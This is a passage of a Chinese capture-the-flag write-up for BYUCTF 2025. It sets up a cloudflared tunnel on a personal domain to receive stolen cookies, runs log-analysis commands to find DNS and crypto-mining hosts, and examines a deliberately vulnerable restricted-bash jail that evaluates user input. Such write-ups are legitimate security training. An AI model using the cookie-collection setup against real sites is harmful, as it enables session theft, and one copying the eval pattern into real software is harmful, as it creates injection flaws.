</span></span></code></pre></td></tr></table></div></div><p>现在改成9999端口准备收Cookie，<code>cloudflared tunnel --url http://localhost:9999</code>，注意这个html要放在github pages上面，不然也不能成功</p><p><img src=/p/byuctf2025/QQ20250518-114842.jpg width=1291 height=725 loading=lazy alt=1></p><p>不过这样产生的域名很长，我们可以使用自己的域名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cloudflared tunnel create attack-tunnel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cloudflared tunnel route dns c5c55717-14ae-4b8c-95f7-bf770c9bee16 9999.rb3.top
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mkdir -p /root/.cloudflared/
</span></span><span class=line><span class=cl>nano /root/.cloudflared/config.yml
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=nt>tunnel</span><span class=p>:</span><span class=w> </span><span class=l>c5c55717-14ae-4b8c-95f7-bf770c9bee16</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>credentials-file</span><span class=p>:</span><span class=w> </span><span class=l>~/.cloudflared/c5c55717-14ae-4b8c-95f7-bf770c9bee16.json</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>ingress</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span>- <span class=nt>hostname</span><span class=p>:</span><span class=w> </span><span class=m>9999.</span><span class=l>rb3.top</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>service</span><span class=p>:</span><span class=w> </span><span class=l>http://localhost:9999</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span>- <span class=nt>service</span><span class=p>:</span><span class=w> </span><span class=l>http_status:404</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>就配置好了，运行这两个都可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cloudflared tunnel run attack-tunnel
</span></span><span class=line><span class=cl>cloudflared tunnel run c5c55717-14ae-4b8c-95f7-bf770c9bee16
</span></span></code></pre></td></tr></table></div></div><h2 id=are-you-looking-me-up>Are You Looking Me Up?</h2><p>DNS请求日志，首先我们要知道哪些是DNS请求，通常DNS请求使用的是UDP协议，端口是53。直接让AI写个命令提取出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>grep -E &#34;,53,&#34; logs.txt | awk -F, &#39;{for(i=1;i&lt;=NF;i++) if($i~/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ &amp;&amp; $(i+2)==&#34;53&#34;) print $i}&#39; | sort | uniq -c | sort -nr
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/byuctf2025/QQ20250517-190040.jpg width=939 height=624 loading=lazy alt=1></p><p>交这个最多的就是对了</p><h2 id=mine-over-matter>Mine Over Matter</h2><blockquote><p>Your SOC has flagged unusual outbound traffic on a segment of your network. After capturing logs from the router during the anomaly, they handed it over to you—the network analyst.</p><p>Somewhere in this mess, two compromised hosts are secretly mining cryptocurrency and draining resources. Analyze the traffic, identify the two rogue IP addresses running miners, and report them to the Incident Response team before your network becomes a crypto farm.</p></blockquote><p>找挖矿的，一般都是那种挖矿池里面的端口，写个查找外链接数量的命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>grep -E &#39;,(3333|4444|5555|7777|8888|9999|14433|14444|45560|45700|16060),&#39; logfile.txt | awk -F, &#39;{
</span></span><span class=line><span class=cl>&gt;   for(i=1; i&lt;=NF; i++) 
</span></span><span class=line><span class=cl>&gt;     if($i~/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) {
</span></span><span class=line><span class=cl>&gt;       srcip=$i; 
</span></span><span class=line><span class=cl>&gt;       break;
</span></span><span class=line><span class=cl>&gt;     }
</span></span><span class=line><span class=cl>&gt;   print srcip
</span></span><span class=line><span class=cl>&gt; }&#39; | sort | uniq -c | sort -nr | head -10
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/byuctf2025/QQ20250517-191844.jpg width=1196 height=651 loading=lazy alt=1></p><p>直接冲了<code>byuctf{172.16.0.10,172.16.0.5}</code></p><h2 id=enabled>Enabled</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>unset</span> PATH
</span></span><span class=line><span class=cl><span class=nb>enable</span> -n <span class=nb>exec</span>
</span></span><span class=line><span class=cl><span class=nb>enable</span> -n <span class=nb>command</span>
</span></span><span class=line><span class=cl><span class=nb>enable</span> -n <span class=nb>type</span>
</span></span><span class=line><span class=cl><span class=nb>enable</span> -n <span class=nb>hash</span>
</span></span><span class=line><span class=cl><span class=nb>enable</span> -n <span class=nb>cd</span>
</span></span><span class=line><span class=cl><span class=nb>enable</span> -n <span class=nb>enable</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> +x
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Welcome to my new bash, sbash, the Safe Bourne Again Shell! There&#39;s no exploiting this system&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nb>read</span> -p <span class=s2>&#34;safe_bash&gt; &#34;</span> user_input
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Check if input is empty</span>
</span></span><span class=line><span class=cl>    <span class=o>[[</span> -z <span class=s2>&#34;</span><span class=nv>$user_input</span><span class=s2>&#34;</span> <span class=o>]]</span> <span class=o>&amp;&amp;</span> <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=s2>&#34;</span><span class=nv>$user_input</span><span class=s2>&#34;</span> in 
</span></span><span class=line><span class=cl>        *<span class=s2>&#34;&gt;&#34;</span>*<span class=p>|</span>*<span class=s2>&#34;&lt;&#34;</span>*<span class=p>|</span>*<span class=s2>&#34;/&#34;</span>*<span class=p>|</span>*<span class=s2>&#34;;&#34;</span>*<span class=p>|</span>*<span class=s2>&#34;&amp;&#34;</span>*<span class=p>|</span>*<span class=s2>&#34;</span>$<span class=s2>&#34;</span>*<span class=p>|</span>*<span class=s2>&#34;(&#34;</span>*<span class=p>|</span>*<span class=s2>&#34;\`&#34;</span>*<span class=o>)</span> <span class=nb>echo</span> <span class=s2>&#34;No special characters, those are unsafe!&#34;</span> <span class=o>&amp;&amp;</span> <span class=k>continue</span><span class=p>;;</span>
</span></span><span class=line><span class=cl>    <span class=k>esac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Execute only if it&#39;s a Bash builtin</span>
</span></span><span class=line><span class=cl>    <span class=nb>eval</span> <span class=s2>&#34;</span><span class=nv>$user_input</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>禁用了一部分关键词<code>>|&lt;|/|;|&|$|(|</code>以及反引号，执行<code>pwd</code>得知在<code>/app</code>，并且发现当前目录还有一个<code>run</code>，没有什么发现，利用<code>compgen -c</code>列出所有当前可以使用的命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>baozongw1</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>Desktop</span><span class=o>/</span><span class=n>MiscTools</span><span class=o>$</span> <span class=n>nc</span> <span class=n>enabled</span><span class=o>.</span><span class=n>chal</span><span class=o>.</span><span class=n>cyberjousting</span><span class=o>.</span><span class=n>com</span> <span class=mi>1352</span>
</span></span><span class=line><span class=cl><span class=n>Welcome</span> <span class=n>to</span> <span class=n>my</span> <span class=n>new</span> <span class=n>bash</span><span class=p>,</span> <span class=n>sbash</span><span class=p>,</span> <span class=n>the</span> <span class=n>Safe</span> <span class=n>Bourne</span> <span class=n>Again</span> <span class=n>Shell</span><span class=o>!</span> <span class=n>There</span><span class=s1>&#39;s no exploiting this system</span>
</span></span><span class=line><span class=cl><span class=n>compgen</span> <span class=o>-</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=k>if</span>
</span></span><span class=line><span class=cl><span class=n>then</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl><span class=k>elif</span>
</span></span><span class=line><span class=cl><span class=n>fi</span>
</span></span><span class=line><span class=cl><span class=k>case</span>
</span></span><span class=line><span class=cl><span class=n>esac</span>
</span></span><span class=line><span class=cl><span class=k>for</span>
</span></span><span class=line><span class=cl><span class=n>select</span>
</span></span><span class=line><span class=cl><span class=k>while</span>
</span></span><span class=line><span class=cl><span class=n>until</span>
</span></span><span class=line><span class=cl><span class=k>do</span>
</span></span><span class=line><span class=cl><span class=n>done</span>
</span></span><span class=line><span class=cl><span class=ow>in</span>
</span></span><span class=line><span class=cl><span class=n>function</span>
</span></span><span class=line><span class=cl><span class=n>time</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[[</span>
</span></span><span class=line><span class=cl><span class=p>]]</span>
</span></span><span class=line><span class=cl><span class=n>coproc</span>
</span></span><span class=line><span class=cl><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=p>[</span>
</span></span><span class=line><span class=cl><span class=n>alias</span>
</span></span><span class=line><span class=cl><span class=n>bg</span>
</span></span><span class=line><span class=cl><span class=n>bind</span>
</span></span><span class=line><span class=cl><span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>builtin</span>
</span></span><span class=line><span class=cl><span class=n>caller</span>
</span></span><span class=line><span class=cl><span class=n>compgen</span>
</span></span><span class=line><span class=cl><span class=n>complete</span>
</span></span><span class=line><span class=cl><span class=n>compopt</span>
</span></span><span class=line><span class=cl><span class=k>continue</span>
</span></span><span class=line><span class=cl><span class=n>declare</span>
</span></span><span class=line><span class=cl><span class=n>dirs</span>
</span></span><span class=line><span class=cl><span class=n>disown</span>
</span></span><span class=line><span class=cl><span class=n>echo</span>
</span></span><span class=line><span class=cl><span class=n>eval</span>
</span></span><span class=line><span class=cl><span class=n>exit</span>
</span></span><span class=line><span class=cl><span class=k>export</span>
</span></span><span class=line><span class=cl><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=n>fc</span>
</span></span><span class=line><span class=cl><span class=n>fg</span>
</span></span><span class=line><span class=cl><span class=n>getopts</span>
</span></span><span class=line><span class=cl><span class=n>help</span>
</span></span><span class=line><span class=cl><span class=n>history</span>
</span></span><span class=line><span class=cl><span class=n>jobs</span>
</span></span><span class=line><span class=cl><span class=n>kill</span>
</span></span><span class=line><span class=cl><span class=n>let</span>
</span></span><span class=line><span class=cl><span class=n>local</span>
</span></span><span class=line><span class=cl><span class=n>logout</span>
</span></span><span class=line><span class=cl><span class=n>mapfile</span>
</span></span><span class=line><span class=cl><span class=n>popd</span>
</span></span><span class=line><span class=cl><span class=n>printf</span>
</span></span><span class=line><span class=cl><span class=n>pushd</span>
</span></span><span class=line><span class=cl><span class=n>pwd</span>
</span></span><span class=line><span class=cl><span class=n>read</span>
</span></span><span class=line><span class=cl><span class=n>readarray</span>
</span></span><span class=line><span class=cl><span class=n>readonly</span>
</span></span><span class=line><span class=cl><span class=k>return</span>
</span></span><span class=line><span class=cl><span class=n>set</span>
</span></span><span class=line><span class=cl><span class=n>shift</span>
</span></span><span class=line><span class=cl><span class=n>shopt</span>
</span></span><span class=line><span class=cl><span class=n>source</span>
</span></span><span class=line><span class=cl><span class=n>suspend</span>
</span></span><span class=line><span class=cl><span class=n>test</span>
</span></span><span class=line><span class=cl><span class=n>times</span>
</span></span><span class=line><span class=cl><span class=n>trap</span>
</span></span><span class=line><span class=cl><span class=bp>true</span>
</span></span><span class=line><span class=cl><span class=n>typeset</span>
</span></span><span class=line><span class=cl><span class=n>ulimit</span>
</span></span><span class=line><span class=cl><span class=n>umask</span>
</span></span><span class=line><span class=cl><span class=n>unalias</span>
</span></span><span class=line><span class=cl><span class=n>unset</span>
</span></span><span class=line><span class=cl><span class=n>wait</span>
</span></span></code></pre></td></tr></table></div></div><p>先利用<code>declare -p</code>找下环境变量，发现没有flag，运行了一下<code>help</code>得知了这些</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>GNU</span> <span class=n>bash</span><span class=p>,</span> <span class=n>version</span> <span class=mf>5.2</span><span class=o>.</span><span class=mi>21</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>-</span><span class=n>release</span> <span class=p>(</span><span class=n>x86_64</span><span class=o>-</span><span class=n>pc</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>These</span> <span class=n>shell</span> <span class=n>commands</span> <span class=n>are</span> <span class=n>defined</span> <span class=n>internally</span><span class=o>.</span>  <span class=n>Type</span> <span class=err>`</span><span class=n>help</span><span class=s1>&#39; to see this list.</span>
</span></span><span class=line><span class=cl><span class=n>Type</span> <span class=err>`</span><span class=n>help</span> <span class=n>name</span><span class=s1>&#39; to find out more about the function `name&#39;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=err>`</span><span class=n>info</span> <span class=n>bash</span><span class=s1>&#39; to find out more about the shell in general.</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=err>`</span><span class=n>man</span> <span class=o>-</span><span class=n>k</span><span class=s1>&#39; or `info&#39;</span> <span class=n>to</span> <span class=n>find</span> <span class=n>out</span> <span class=n>more</span> <span class=n>about</span> <span class=n>commands</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>this</span> <span class=n>list</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=n>star</span> <span class=p>(</span><span class=o>*</span><span class=p>)</span> <span class=n>next</span> <span class=n>to</span> <span class=n>a</span> <span class=n>name</span> <span class=n>means</span> <span class=n>that</span> <span class=n>the</span> <span class=n>command</span> <span class=n>is</span> <span class=n>disabled</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=n>job_spec</span> <span class=p>[</span><span class=o>&amp;</span><span class=p>]</span>                            <span class=n>history</span> <span class=p>[</span><span class=o>-</span><span class=n>c</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>d</span> <span class=n>offset</span><span class=p>]</span> <span class=p>[</span><span class=n>n</span><span class=p>]</span> <span class=ow>or</span> <span class=n>hist</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=p>((</span> <span class=n>expression</span> <span class=p>))</span>                        <span class=k>if</span> <span class=n>COMMANDS</span><span class=p>;</span> <span class=n>then</span> <span class=n>COMMANDS</span><span class=p>;</span> <span class=p>[</span> <span class=k>elif</span> <span class=n>C</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=o>.</span> <span class=n>filename</span> <span class=p>[</span><span class=n>arguments</span><span class=p>]</span>                  <span class=n>jobs</span> <span class=p>[</span><span class=o>-</span><span class=n>lnprs</span><span class=p>]</span> <span class=p>[</span><span class=n>jobspec</span> <span class=o>...</span><span class=p>]</span> <span class=ow>or</span> <span class=n>jobs</span> <span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=p>:</span>                                       <span class=n>kill</span> <span class=p>[</span><span class=o>-</span><span class=n>s</span> <span class=n>sigspec</span> <span class=o>|</span> <span class=o>-</span><span class=n>n</span> <span class=n>signum</span> <span class=o>|</span> <span class=o>-</span><span class=n>sigs</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=p>[</span> <span class=n>arg</span><span class=o>...</span> <span class=p>]</span>                              <span class=n>let</span> <span class=n>arg</span> <span class=p>[</span><span class=n>arg</span> <span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=p>[[</span> <span class=n>expression</span> <span class=p>]]</span>                        <span class=n>local</span> <span class=p>[</span><span class=n>option</span><span class=p>]</span> <span class=n>name</span><span class=p>[</span><span class=o>=</span><span class=n>value</span><span class=p>]</span> <span class=o>...</span>
</span></span><span class=line><span class=cl> <span class=n>alias</span> <span class=p>[</span><span class=o>-</span><span class=n>p</span><span class=p>]</span> <span class=p>[</span><span class=n>name</span><span class=p>[</span><span class=o>=</span><span class=n>value</span><span class=p>]</span> <span class=o>...</span> <span class=p>]</span>          <span class=n>logout</span> <span class=p>[</span><span class=n>n</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>bg</span> <span class=p>[</span><span class=n>job_spec</span> <span class=o>...</span><span class=p>]</span>                       <span class=n>mapfile</span> <span class=p>[</span><span class=o>-</span><span class=n>d</span> <span class=n>delim</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>n</span> <span class=n>count</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>O</span> <span class=ow>or</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=n>bind</span> <span class=p>[</span><span class=o>-</span><span class=n>lpsvPSVX</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>m</span> <span class=n>keymap</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>f</span> <span class=n>file</span><span class=o>&gt;</span>  <span class=n>popd</span> <span class=p>[</span><span class=o>-</span><span class=n>n</span><span class=p>]</span> <span class=p>[</span><span class=o>+</span><span class=n>N</span> <span class=o>|</span> <span class=o>-</span><span class=n>N</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=k>break</span> <span class=p>[</span><span class=n>n</span><span class=p>]</span>                               <span class=n>printf</span> <span class=p>[</span><span class=o>-</span><span class=n>v</span> <span class=k>var</span><span class=p>]</span> <span class=n>format</span> <span class=p>[</span><span class=n>arguments</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>builtin</span> <span class=p>[</span><span class=n>shell</span><span class=o>-</span><span class=n>builtin</span> <span class=p>[</span><span class=n>arg</span> <span class=o>...</span><span class=p>]]</span>       <span class=n>pushd</span> <span class=p>[</span><span class=o>-</span><span class=n>n</span><span class=p>]</span> <span class=p>[</span><span class=o>+</span><span class=n>N</span> <span class=o>|</span> <span class=o>-</span><span class=n>N</span> <span class=o>|</span> <span class=n>dir</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>caller</span> <span class=p>[</span><span class=n>expr</span><span class=p>]</span>                           <span class=n>pwd</span> <span class=p>[</span><span class=o>-</span><span class=n>LP</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=k>case</span> <span class=n>WORD</span> <span class=ow>in</span> <span class=p>[</span><span class=n>PATTERN</span> <span class=p>[</span><span class=o>|</span> <span class=n>PATTERN</span><span class=p>]</span><span class=o>...</span><span class=p>)</span><span class=o>&gt;</span>  <span class=n>read</span> <span class=p>[</span><span class=o>-</span><span class=n>ers</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>a</span> <span class=n>array</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>d</span> <span class=n>delim</span><span class=p>]</span> <span class=p>[</span><span class=o>-&gt;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>cd</span> <span class=p>[</span><span class=o>-</span><span class=n>L</span><span class=o>|</span><span class=p>[</span><span class=o>-</span><span class=n>P</span> <span class=p>[</span><span class=o>-</span><span class=n>e</span><span class=p>]]</span> <span class=p>[</span><span class=o>-</span><span class=err>@</span><span class=p>]]</span> <span class=p>[</span><span class=n>dir</span><span class=p>]</span>            <span class=n>readarray</span> <span class=p>[</span><span class=o>-</span><span class=n>d</span> <span class=n>delim</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>n</span> <span class=n>count</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>O</span> <span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>command</span> <span class=p>[</span><span class=o>-</span><span class=n>pVv</span><span class=p>]</span> <span class=n>command</span> <span class=p>[</span><span class=n>arg</span> <span class=o>...</span><span class=p>]</span>        <span class=n>readonly</span> <span class=p>[</span><span class=o>-</span><span class=n>aAf</span><span class=p>]</span> <span class=p>[</span><span class=n>name</span><span class=p>[</span><span class=o>=</span><span class=n>value</span><span class=p>]</span> <span class=o>...</span><span class=p>]</span> <span class=n>o</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=n>compgen</span> <span class=p>[</span><span class=o>-</span><span class=n>abcdefgjksuv</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>o</span> <span class=n>option</span><span class=p>]</span> <span class=p>[</span><span class=o>&gt;</span>  <span class=k>return</span> <span class=p>[</span><span class=n>n</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>complete</span> <span class=p>[</span><span class=o>-</span><span class=n>abcdefgjksuv</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>pr</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>DEI</span><span class=p>]</span><span class=o>&gt;</span>  <span class=n>select</span> <span class=n>NAME</span> <span class=p>[</span><span class=ow>in</span> <span class=n>WORDS</span> <span class=o>...</span> <span class=p>;]</span> <span class=k>do</span> <span class=n>COMM</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=n>compopt</span> <span class=p>[</span><span class=o>-</span><span class=n>o</span><span class=o>|+</span><span class=n>o</span> <span class=n>option</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>DEI</span><span class=p>]</span> <span class=p>[</span><span class=n>name</span> <span class=o>.&gt;</span>  <span class=n>set</span> <span class=p>[</span><span class=o>-</span><span class=n>abefhkmnptuvxBCEHPT</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>o</span> <span class=n>optio</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=k>continue</span> <span class=p>[</span><span class=n>n</span><span class=p>]</span>                            <span class=n>shift</span> <span class=p>[</span><span class=n>n</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>coproc</span> <span class=p>[</span><span class=n>NAME</span><span class=p>]</span> <span class=n>command</span> <span class=p>[</span><span class=n>redirections</span><span class=p>]</span>    <span class=n>shopt</span> <span class=p>[</span><span class=o>-</span><span class=n>pqsu</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>o</span><span class=p>]</span> <span class=p>[</span><span class=n>optname</span> <span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>declare</span> <span class=p>[</span><span class=o>-</span><span class=n>aAfFgiIlnrtux</span><span class=p>]</span> <span class=p>[</span><span class=n>name</span><span class=p>[</span><span class=o>=</span><span class=n>value</span><span class=o>&gt;</span>  <span class=n>source</span> <span class=n>filename</span> <span class=p>[</span><span class=n>arguments</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>dirs</span> <span class=p>[</span><span class=o>-</span><span class=n>clpv</span><span class=p>]</span> <span class=p>[</span><span class=o>+</span><span class=n>N</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>N</span><span class=p>]</span>                  <span class=n>suspend</span> <span class=p>[</span><span class=o>-</span><span class=n>f</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>disown</span> <span class=p>[</span><span class=o>-</span><span class=n>h</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>ar</span><span class=p>]</span> <span class=p>[</span><span class=n>jobspec</span> <span class=o>...</span> <span class=o>|</span> <span class=n>pid</span> <span class=o>&gt;</span>  <span class=n>test</span> <span class=p>[</span><span class=n>expr</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>echo</span> <span class=p>[</span><span class=o>-</span><span class=n>neE</span><span class=p>]</span> <span class=p>[</span><span class=n>arg</span> <span class=o>...</span><span class=p>]</span>                   <span class=n>time</span> <span class=p>[</span><span class=o>-</span><span class=n>p</span><span class=p>]</span> <span class=n>pipeline</span>
